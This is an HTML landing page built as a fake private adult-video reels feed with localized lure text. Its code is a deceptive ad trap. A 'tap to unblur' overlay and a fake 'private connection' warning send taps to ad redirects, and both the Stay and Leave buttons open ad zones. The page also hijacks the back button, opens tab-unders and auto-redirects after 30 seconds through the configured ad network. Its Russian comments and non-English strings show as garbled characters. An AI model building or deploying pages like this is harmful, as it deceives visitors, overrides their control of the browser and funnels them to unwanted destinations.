<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="theme-color" content="#000000" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />

  <title>(1) Private Video Request</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2250%22 fill=%22%23ff0000%22/><path d=%22M35 30 L75 50 L35 70 Z%22 fill=%22%23ffffff%22/></svg>">

  <script>
  var APP_CONFIG = {
    domain: "https://jup9.com",

    // 1) MAIN EXIT (Stage 2 tap)
    mainExit_currentTab_zoneId: 10217421,
    mainExit_newTab_zoneId: 10217420,

    // 2) TAB UNDER (Stay) ‚Äî –¢–û–õ–¨–ö–û newTab. –ù–ò–ö–ê–ö–ò–• currentTab_* —Ç—É—Ç –Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å.
    tabUnderClick_newTab_zoneId: 10557765,

    // 3) AGE EXIT (Leave)
    ageExit_currentTab_zoneId: 10557767,
    ageExit_newTab_zoneId: 10557766,

    // Other
    autoexit_zoneId: 10217422,
    autoexit_timeToRedirect: 30,
    reverse_zoneId: 10217419,
    back_zoneId: 10217423,
    back_count: 8
  };
  </script>

  <style>
    * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
    html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }

    .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }

    .video-layer {
      position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000;
      opacity: 0; transition: opacity 0.3s ease-out; pointer-events: none;
    }
    .video-layer.active { opacity: 1; z-index: 1; }

    .blur-overlay {
      position: absolute; inset: 0; z-index: 100;
      backdrop-filter: blur(15px) brightness(0.65);
      -webkit-backdrop-filter: blur(15px) brightness(0.65);
      display: none; flex-direction: column; align-items: center; justify-content: center;
      pointer-events: none; /* –∫–ª–∏–∫–∏ –ø—Ä–æ—Ö–æ–¥—è—Ç —Å–∫–≤–æ–∑—å –Ω–µ–≥–æ => Stage2 tap = mainExit */
    }

    .lock-badge {
      background: rgba(0, 0, 0, 0.45); border: 1px solid rgba(255, 255, 255, 0.25);
      backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
      padding: 24px 32px; border-radius: 28px;
      display: flex; flex-direction: column; align-items: center; gap: 14px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
      transform: translateZ(0);
    }
    .lock-icon-wrap { width: 56px; height: 56px; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .lock-badge h2 { color: #fff; margin: 0; font-size: 19px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
    .lock-badge p { color: rgba(255,255,255,0.9); margin: 0; font-size: 14px; text-align: center; }

    .reels-ui {
      position: absolute; inset: 0; z-index: 200;
      display: flex; flex-direction: column; justify-content: space-between;
      pointer-events: none;
      background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.9) 100%);
      transform: translateZ(10px);
    }

    .modal-overlay {
      position: fixed; inset: 0; z-index: 9999;
      background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(5px);
      display: none; align-items: center; justify-content: center;
      animation: fadeIn 0.2s ease-out;
    }
    .modal-box {
      background: #1c1c1e; width: 85%; max-width: 320px; border-radius: 16px; text-align: center;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); transform: scale(0.95);
      animation: popIn 0.2s forwards; overflow: hidden;
    }
    .modal-header { padding: 24px 20px; }
    .modal-icon { font-size: 36px; margin-bottom: 12px; display: block; }
    .modal-title { color: #fff; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
    .modal-text { color: #aeaeb2; font-size: 15px; line-height: 1.4; }
    .modal-actions { display: flex; border-top: 1px solid #38383a; }
    .modal-btn {
      flex: 1; padding: 18px; font-size: 17px; font-weight: 600;
      background: transparent; border: none; cursor: pointer; border-right: 1px solid #38383a;
    }
    .modal-btn:last-child { border-right: none; }
    .modal-btn:active { background: #2c2c2e; }
    .btn-stay { color: #0a84ff; }
    .btn-leave { color: #8e8e93; font-weight: 400; }

    .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
    .back-area { padding: 20px; margin: -20px; cursor: pointer; display: flex; align-items: center; justify-content: center; pointer-events: auto; }
    .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }

    .right-actions { position: absolute; right: 8px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto; }
    .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(2px); margin-bottom: 2px; }
    .action-text { font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }

    .bottom-info { padding: 16px; color: #fff; margin-right: 60px; pointer-events: auto; }
    .avatar { width: 36px; height: 36px; border-radius: 50%; background: #ff0050; border: 2px solid #fff; transition: background-color 0.3s; }
    .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); margin-bottom: 4px; }
    .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }

    .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
    .slide-in-up { animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; visibility: visible !important; z-index: 2 !important; }
    @keyframes slideOutUp { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-100%); opacity: 1; } }
    @keyframes slideInUp { 0% { transform: translateY(100%); opacity: 1; } 100% { transform: translateY(0); opacity: 1; } }

    .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
    @keyframes shake {
      10%, 90% { transform: translate3d(-2px, 0, 0); }
      20%, 80% { transform: translate3d(4px, 0, 0); }
      30%, 50%, 70% { transform: translate3d(-6px, 0, 0); }
      40%, 60% { transform: translate3d(6px, 0, 0); }
    }

    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }

    .swipe-hint { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 50; pointer-events: none; display: flex; flex-direction: column; align-items: center; }
    .hand-icon { font-size: 50px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: swipeUp 1.8s infinite ease-in-out; }
    @keyframes swipeUp { 0% { transform: translateY(40px); opacity: 0; } 40% { opacity: 1; } 80% { opacity: 0; } 100% { transform: translateY(-60px); opacity: 0; } }
  </style>
</head>

<body>
  <div class="reels-wrapper" id="click-trap">
    <video id="v1" class="video-layer active" playsinline webkit-playsinline muted loop preload="auto"></video>
    <video id="v2" class="video-layer" playsinline webkit-playsinline muted loop preload="auto"></video>

    <div id="blur-layer" class="blur-overlay">
      <div class="lock-badge" id="lock-badge">
        <div class="lock-icon-wrap">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
        <h2 id="t-title">Sensitive Content</h2>
        <p id="t-desc">Tap to unblur and continue</p>
      </div>
    </div>

    <div id="exit-modal" class="modal-overlay">
      <div class="modal-box">
        <div class="modal-header">
          <span class="modal-icon">‚ö†Ô∏è</span>
          <div class="modal-title" id="m-title">Wait!</div>
          <div class="modal-text" id="m-text">You are closing a private connection. Access will be lost.</div>
        </div>
        <div class="modal-actions">
          <button class="modal-btn btn-leave" id="btn-leave">Leave</button>
          <button class="modal-btn btn-stay" id="btn-stay">Stay</button>
        </div>
      </div>
    </div>

    <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">üëÜ</div></div>

    <div class="reels-ui">
      <div class="top-bar">
        <div class="back-area" id="back-trigger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="15 18 9 12 15 6"></polyline>
          </svg>
        </div>
        <div class="filter-pill">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
            <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon>
          </svg>
          <span>Filters</span>
        </div>
      </div>

      <div class="right-actions">
        <div class="action-btn">
          <div class="icon-circle">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
              <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
            </svg>
          </div>
          <span class="action-text" id="ui-likes">93</span>
        </div>
        <div class="action-btn">
          <div class="icon-circle">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
              <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
            </svg>
          </div>
          <span class="action-text">Share</span>
        </div>
        <div class="action-btn">
          <div class="icon-circle">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
              <path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/>
              <path d="M18 7L21 4" stroke-width="2.5"/>
              <path d="M14 10L12 7" stroke-width="2"/>
              <path d="M20 10L22 13" stroke-width="2"/>
              <path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/>
            </svg>
          </div>
        </div>
      </div>

      <div class="bottom-info">
        <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
          <div class="avatar" id="ui-avatar"></div>
          <div class="username" id="ui-username">@Sweet_Alice</div>
        </div>
        <div class="desc" id="ui-desc">Do you like my view? üòà <br>Check link in bio... üëá</div>
      </div>
    </div>
  </div>

  <!-- UI / Stage logic -->
  <script>
  document.addEventListener("DOMContentLoaded", () => {
    const reelsData = [
      {},
      { user: "@Sweet_Alice", likes: "93", desc: "Do you like my view? üòà <br>Check link in bio... üëá", color: "#ff0050" },
      { user: "@Naughty_Kate", likes: "12.4k", desc: "Wait for the end... üí¶ <br>Link in bio!", color: "#0095f6" }
    ];

    const translations = {
      en: { title: "Sensitive Content", desc: "Tap to unblur and continue", mTitle: "Wait!", mText: "You are closing a private connection. Access will be lost.", stay: "Stay", leave: "Leave" },
      ru: { title: "–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç", desc: "–ù–∞–∂–º–∏, —á—Ç–æ–±—ã —Å–º–æ—Ç—Ä–µ—Ç—å", mTitle: "–ü–æ–¥–æ–∂–¥–∏!", mText: "–í—ã –∑–∞–∫—Ä—ã–≤–∞–µ—Ç–µ –ø—Ä–∏–≤–∞—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ. –î–æ—Å—Ç—É–ø –±—É–¥–µ—Ç —É—Ç–µ—Ä—è–Ω.", stay: "–û—Å—Ç–∞—Ç—å—Å—è", leave: "–£–π—Ç–∏" },
      es: { title: "Contenido sensible", desc: "Toca para desbloquear", mTitle: "¬°Espera!", mText: "Est√°s cerrando una conexi√≥n privada. Se perder√° el acceso.", stay: "Quedarse", leave: "Salir" },
      de: { title: "Sensibler Inhalt", desc: "Zum Entsperren tippen", mTitle: "Warte!", mText: "Der Zugriff geht verloren.", stay: "Bleiben", leave: "Verlassen" },
      fr: { title: "Contenu sensible", desc: "Appuyez pour d√©bloquer", mTitle: "Attendez !", mText: "L'acc√®s sera perdu.", stay: "Rester", leave: "Quitter" },
      pt: { title: "Conte√∫do sens√≠vel", desc: "Toque para desbloquear", mTitle: "Espere!", mText: "O acesso ser√° perdido.", stay: "Ficar", leave: "Sair" },
      it: { title: "Contenuto sensibile", desc: "Tocca per sbloccare", mTitle: "Attendi!", mText: "L'accesso andr√† perso.", stay: "Resta", leave: "Esci" },
      tr: { title: "Hassas ƒ∞√ßerik", desc: "A√ßmak i√ßin dokunun", mTitle: "Bekle!", mText: "Eri≈üim kaybolacak.", stay: "Kal", leave: "Ayrƒ±l" },
      ar: { title: "ŸÖÿ≠ÿ™ŸàŸâ ÿ≠ÿ≥ÿßÿ≥", desc: "ÿßÿ∂ÿ∫ÿ∑ ŸÑÿ•ŸÑÿ∫ÿßÿ° ÿßŸÑŸÇŸÅŸÑ", mTitle: "ÿßŸÜÿ™ÿ∏ÿ±!", mText: "ÿ≥Ÿäÿ™ŸÖ ŸÅŸÇÿØÿßŸÜ ÿßŸÑŸàÿµŸàŸÑ.", stay: "ÿßŸÑÿ®ŸÇÿßÿ°", leave: "ÿßŸÑŸÖÿ∫ÿßÿØÿ±ÿ©" },
      zh: { title: "ÊïèÊÑüÂÜÖÂÆπ", desc: "ÁÇπÂáªËß£ÈîÅÂπ∂ÁªßÁª≠", mTitle: "Á≠âÁ≠âÔºÅ", mText: "ËÆøÈóÆÊùÉÈôêÂ∞Ü‰∏¢Â§±„ÄÇ", stay: "ÁïôÂú®", leave: "Á¶ªÂºÄ" },
      ja: { title: "‰∏çÈÅ©Âàá„Å™ÂÜÖÂÆπ", desc: "„Çø„ÉÉ„Éó„Åó„Å¶Ëß£Èô§", mTitle: "ÂæÖ„Å£„Å¶ÔºÅ", mText: "„Ç¢„ÇØ„Çª„Çπ„Åß„Åç„Å™„Åè„Å™„Çä„Åæ„Åô„ÄÇ", stay: "ÊÆã„Çã", leave: "ÈÄÄÂá∫„Åô„Çã" },
      ko: { title: "ÎØºÍ∞êÌïú ÏΩòÌÖêÏ∏†", desc: "Ïû†Í∏àÏùÑ Ìï¥Ï†úÌïòÎ†§Î©¥ ÌÉ≠ÌïòÏÑ∏Ïöî", mTitle: "Ïû†ÍπêÎßåÏöî!", mText: "Ïï°ÏÑ∏Ïä§ Í∂åÌïúÏù¥ ÏÜêÏã§Îê©ÎãàÎã§.", stay: "Î®∏Î¨¥Î•¥Îã§", leave: "Îñ†ÎÇòÎã§" },
      hi: { title: "‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä", desc: "‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ü‡•à‡§™ ‡§ï‡§∞‡•á‡§Ç", mTitle: "‡§∞‡•Å‡§ï‡•ã!", mText: "‡§™‡§π‡•Å‡§Ç‡§ö ‡§ñ‡•ã ‡§ú‡§æ‡§è‡§ó‡•Ä‡•§", stay: "‡§∞‡§π‡•ã", leave: "‡§õ‡•ã‡§°‡§º‡•ã" },
      id: { title: "Konten Sensitif", desc: "Ketuk untuk membuka", mTitle: "Tunggu!", mText: "Akses akan hilang.", stay: "Tetap", leave: "Tinggalkan" },
      vi: { title: "N·ªôi dung nh·∫°y c·∫£m", desc: "Nh·∫•n ƒë·ªÉ m·ªü kh√≥a", mTitle: "Ch·ªù ƒë√£!", mText: "Quy·ªÅn truy c·∫≠p s·∫Ω b·ªã m·∫•t.", stay: "·ªû l·∫°i", leave: "R·ªùi ƒëi" },
      th: { title: "‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤‡∏ó‡∏µ‡πà‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏≠‡πà‡∏≠‡∏ô", desc: "‡πÅ‡∏ï‡∏∞‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏õ‡∏•‡∏î‡∏•‡πá‡∏≠‡∏Å", mTitle: "‡πÄ‡∏î‡∏µ‡πã‡∏¢‡∏ß‡∏Å‡πà‡∏≠‡∏ô!", mText: "‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡∏à‡∏∞‡∏´‡∏≤‡∏¢‡πÑ‡∏õ", stay: "‡∏≠‡∏¢‡∏π‡πà‡∏ï‡πà‡∏≠", leave: "‡∏≠‡∏≠‡∏Å‡πÑ‡∏õ" }
    };

    const userLang = (navigator.language || "en").slice(0, 2).toLowerCase();
    const t = translations[userLang] || translations.en;

    document.getElementById("t-title").innerText = t.title;
    document.getElementById("t-desc").innerText = t.desc;
    document.getElementById("m-title").innerText = t.mTitle;
    document.getElementById("m-text").innerText = t.mText;
    document.getElementById("btn-stay").innerText = t.stay;
    document.getElementById("btn-leave").innerText = t.leave;

    if (userLang === "ar") {
      document.getElementById("lock-badge").style.direction = "rtl";
      document.getElementById("exit-modal").style.direction = "rtl";
    }

    const v1 = document.getElementById("v1");
    const v2 = document.getElementById("v2");
    const swipeHint = document.getElementById("swipe-hint");
    const blurLayer = document.getElementById("blur-layer");
    const lockBadge = document.getElementById("lock-badge");
    const wrapper = document.querySelector(".reels-wrapper");
    const backTrigger = document.getElementById("back-trigger");
    const exitModal = document.getElementById("exit-modal");

    const uiUser = document.getElementById("ui-username");
    const uiLikes = document.getElementById("ui-likes");
    const uiDesc = document.getElementById("ui-desc");
    const uiAvatar = document.getElementById("ui-avatar");

    const urlParams = new URLSearchParams(window.location.search);
    const offerID = urlParams.get("v") || "1";
    const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4`;

    v1.src = getPath(1);
    v2.src = getPath(2);
    v2.muted = true;
    v1.play().catch(() => {});
    v2.load();

    let stage = 1;
    let isAnimating = false;
    let touchStartY = 0;
    let lastInteractionIsSwipe = false;

    function doSwap(instant = false) {
      if (isAnimating && !instant) return;
      if (!instant) isAnimating = true;
      swipeHint.style.display = "none";

      const newData = reelsData[2];
      uiUser.innerText = newData.user;
      uiLikes.innerText = newData.likes;
      uiDesc.innerHTML = newData.desc;
      uiAvatar.style.backgroundColor = newData.color;

      if (instant) {
        v1.classList.remove("active"); v1.pause();
        v2.classList.add("active"); v2.play().catch(() => {});
        blurLayer.style.display = "flex";
        stage = 2;
      } else {
        v2.play().catch(() => {});
        v1.classList.add("slide-out-up");
        v2.classList.add("slide-in-up");

        setTimeout(() => {
          v1.classList.remove("active", "slide-out-up"); v1.pause();
          v2.classList.add("active"); v2.classList.remove("slide-in-up");
          blurLayer.style.display = "flex";
          stage = 2; isAnimating = false;
        }, 450);
      }
    }

    // restore=2 => —Å—Ä–∞–∑—É stage2
    if (urlParams.get("restore") === "2") { doSwap(true); }

    function triggerShake() {
      lockBadge.classList.remove("shake");
      void lockBadge.offsetWidth;
      lockBadge.classList.add("shake");
    }

    wrapper.addEventListener("touchstart", (e) => {
      touchStartY = e.changedTouches[0].screenY;
      lastInteractionIsSwipe = false;
    }, { passive: true });

    wrapper.addEventListener("touchend", (e) => {
      const touchEndY = e.changedTouches[0].screenY;
      if (touchStartY - touchEndY > 50) {
        lastInteractionIsSwipe = true;
        if (stage === 1) doSwap();
        else triggerShake();
      }
    }, { passive: true });

    window.addEventListener("click", function (e) {
      if (e.target.closest("#exit-modal") || e.target.closest(".back-area")) return;

      if (stage === 1) {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        doSwap();
        if (window.triggerBackFix) window.triggerBackFix();
        return;
      }

      if (stage === 2 && lastInteractionIsSwipe) {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        triggerShake();
        lastInteractionIsSwipe = false;
        return;
      }

      if (stage === 2 && !lastInteractionIsSwipe) {
        e.preventDefault(); e.stopPropagation();
        if (window.triggerMainExit) window.triggerMainExit();
      }
    }, true);

    backTrigger.addEventListener("click", (e) => {
      e.preventDefault(); e.stopPropagation();
      if (stage === 1) {
        doSwap();
        if (window.triggerBackFix) window.triggerBackFix();
      } else {
        exitModal.style.display = "flex";
      }
    });
  });
  </script>

  <!-- –î–í–ò–ñ–û–ö: –í–°–¢–ê–í–¨ –°–Æ–î–ê –¢–í–û–ô –û–†–ò–ì–ò–ù–ê–õ–¨–ù–´–ô –ú–ò–ù–ò–§–ê–ô–õ 1:1 (–∫–∞–∫ —Ç—ã –∫–∏–¥–∞–ª) -->
  <script>
  /* PASTE YOUR ORIGINAL ENGINE HERE (THE HUGE (()=>{var e,t,n,...})();) */
  </script>

  <!-- BRIDGE: –∞–∫–∫—É—Ä–∞—Ç–Ω–æ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–æ–ª—å–∫–æ Stay/Leave, –Ω–µ —Ç—Ä–æ–≥–∞–µ–º –æ—Å—Ç–∞–ª—å–Ω–æ–µ -->
  <script>
  (function () {
    // –∂–¥—ë–º, –ø–æ–∫–∞ –¥–≤–∏–∂–æ–∫ –ø–æ–¥–Ω–∏–º–µ—Ç I/A/P –≤ –≥–ª–æ–±–∞–ª (–æ–±—ã—á–Ω–æ —Å—Ä–∞–∑—É)
    const tryInit = () => {
      try {
        // –≠—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ —Å—É—â–µ—Å—Ç–≤—É—é—Ç –≤–Ω—É—Ç—Ä–∏ –¥–≤–∏–∂–∫–∞. –ï—Å–ª–∏ –∏—Ö –Ω–µ—Ç ‚Äî –∑–Ω–∞—á–∏—Ç —Ç—ã –Ω–µ –≤—Å—Ç–∞–≤–∏–ª –¥–≤–∏–∂–æ–∫.
        if (typeof A !== "function" || typeof I !== "function" || typeof P !== "function") return false;

        const s = A(APP_CONFIG);
        if (!s) return false;

        // —Ç—Ä–∏–≥–≥–µ—Ä—ã –¥–ª—è —Ç–≤–æ–µ–≥–æ UI
        window.triggerMainExit = async () => { await I(s, "mainExit"); };
        window.triggerBackFix = async () => { await P(s); };

        // STAY: —Ç–æ–ª—å–∫–æ newTab (zoneId=10557765), —Ç–µ–∫—É—â—É—é –≤–∫–ª–∞–¥–∫—É –ù–ï —Ç—Ä–æ–≥–∞–µ–º.
        const btnStay = document.getElementById("btn-stay");
        if (btnStay) {
          const newBtnStay = btnStay.cloneNode(true);
          btnStay.parentNode.replaceChild(newBtnStay, btnStay);

          newBtnStay.onclick = async (e) => {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            if (e.cancelBubble !== undefined) e.cancelBubble = true;

            // 1) –ø–æ–º–µ—á–∞–µ–º URL restore=2 –ë–ï–ó —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (—á—Ç–æ–±—ã –ø–æ—Ç–æ–º –º–æ–∂–Ω–æ –±—ã–ª–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å stage2)
            try {
              const u = new URL(window.location.href);
              u.searchParams.set("restore", "2");
              window.history.replaceState(window.history.state, "", u.toString());
            } catch (_) {}

            // 2) tabunder —á–µ—Ä–µ–∑ –¥–≤–∏–∂–æ–∫: –¢–û–õ–¨–ö–û newTab –∏–∑ APP_CONFIG
            await I(s, "tabUnderClick");

            // 3) –∑–∞–∫—Ä—ã–≤–∞–µ–º –º–æ–¥–∞–ª–∫—É –∏ –æ—Å—Ç–∞—ë–º—Å—è –Ω–∞ –ª–µ–Ω–¥–µ
            const modal = document.getElementById("exit-modal");
            if (modal) modal.style.display = "none";

            try { window.focus(); } catch (_) {}
            return false;
          };
        }

        // LEAVE: ageExit
        const btnLeave = document.getElementById("btn-leave");
        if (btnLeave) {
          const newBtnLeave = btnLeave.cloneNode(true);
          btnLeave.parentNode.replaceChild(newBtnLeave, btnLeave);

          newBtnLeave.onclick = async (e) => {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            if (e.cancelBubble !== undefined) e.cancelBubble = true;

            await I(s, "ageExit");
            return false;
          };
        }

        return true;
      } catch (_) {
        return false;
      }
    };

    // –ø—ã—Ç–∞–µ–º—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ –Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ –¥–≤–∏–∂–æ–∫ –≤—Å—Ç–∞–≤–ª–µ–Ω –Ω–∏–∂–µ/–≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–∑–∂–µ
    let tries = 0;
    const timer = setInterval(() => {
      tries += 1;
      if (tryInit() || tries > 50) clearInterval(timer);
    }, 50);
  })();
  </script>
</body>
</html>
